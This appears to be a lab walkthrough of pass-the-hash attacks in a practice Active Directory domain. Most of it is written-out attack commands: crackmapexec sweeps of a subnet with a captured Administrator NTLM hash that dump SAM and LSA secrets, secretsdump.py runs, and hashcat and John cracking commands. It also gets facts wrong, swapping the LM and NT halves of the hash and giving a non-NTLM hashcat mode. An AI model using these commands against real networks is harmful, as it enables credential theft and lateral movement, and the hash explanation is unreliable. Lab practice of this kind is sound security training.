**Pass the Hash / Pass the Password Attack**

If we crack a password, or dump the SAM hashes, we can use that for lateral movement in the network

***crackmapexec smb 192.168.1.0/24 -u fcastle -d MARVEL.local -p Password1***

Here we are swipping entire network

<img width="720" height="155" alt="image" src="https://github.com/user-attachments/assets/c0db0bf4-30e3-44f1-96d5-12b8b69f0cd7" />

<img width="720" height="331" alt="image" src="https://github.com/user-attachments/assets/a540ce0f-adab-42f8-aff0-4f47d71f686f" />

Lets say we have the has but we are not able to crack it. We can also run the commands with the help of hashes as well

**Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::**

We have captured Administrator NTLM hash in earlier labs. We can use that hash

***crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth***

<img width="720" height="127" alt="image" src="https://github.com/user-attachments/assets/8498b651-6708-4857-bd7b-7deb3f65daa0" />

<img width="720" height="196" alt="image" src="https://github.com/user-attachments/assets/e1225121-97b2-49b7-9a0d-04be203931c1" />

So, it confirmed that in both machines, Punisher and Spiderman, there is a local user Administrator which has same password.

We can also dump the hashes as well

***crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam***

<img width="720" height="228" alt="image" src="https://github.com/user-attachments/assets/cc9180ca-80eb-4679-b4b4-fda234a02dff" />

It has dumped all the hashes in database

We can also check the shares available

***crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares***

<img width="720" height="147" alt="image" src="https://github.com/user-attachments/assets/4859e7d2-8138-42a1-b92d-7463f069e46f" />

We can also check LSA as well

***crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --lsa***

<img width="720" height="220" alt="image" src="https://github.com/user-attachments/assets/133d0bdd-13a1-40a2-8579-9cf593ce367b" />

Now, lets check the Database where all the hashes have been dumped

<img width="720" height="452" alt="image" src="https://github.com/user-attachments/assets/25b1b79e-377e-44c8-8e41-885152aa1eb3" />

**Dumping and Cracking Hashes**

***secretsdump.py MARVEL.local/fcastle:”Password1"@192.168.1.11***

<img width="720" height="354" alt="image" src="https://github.com/user-attachments/assets/3da5f24b-d6d9-4d57-94c5-ddc7b5acefbb" />

Important thing to note here is that it dumped SAM hashes. We are interested in Admin and any user’s SAM hash.

Lets try on Spiderman machine

***secretsdump.py MARVEL.local/fcastle:”Password1"@192.168.1.14***

<img width="720" height="408" alt="image" src="https://github.com/user-attachments/assets/a43a4d34-2d77-4f32-88c8-4f3e0e137a97" />

It worked as fcastle is a admin in Spiderman machine. We also got hash for peterpaer user.

If we dont know the password, we can use hash as well

***secretsdump.py administrator:@192.168.1.14 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f***

<img width="720" height="368" alt="image" src="https://github.com/user-attachments/assets/f493db74-125e-491e-880c-072d7e0be073" />

Now, for cracking the hash we can use hashcat

We have NTLM of Administrator

aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f

This hash contains two parts. 1st part is NT and last part is LM. We need LM portion

Lets put this in a file

<img width="655" height="181" alt="image" src="https://github.com/user-attachments/assets/8736340a-cce6-4269-ab48-f1a35288b629" />

***hashcat -m 10000 admin-LM.txt /usr/share/wordlists/rockyou.txt***

<img width="720" height="418" alt="image" src="https://github.com/user-attachments/assets/c4755df3-3034-4d07-9b7f-f2303d7a4e49" />

7facdc498ed1680c4fd1448319a8c04f: Password1!

Lets try with John

***john admin-LM.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT***

<img width="720" height="204" alt="image" src="https://github.com/user-attachments/assets/2f529ba3-4a9c-4a11-8f5e-c2476e816d0d" />



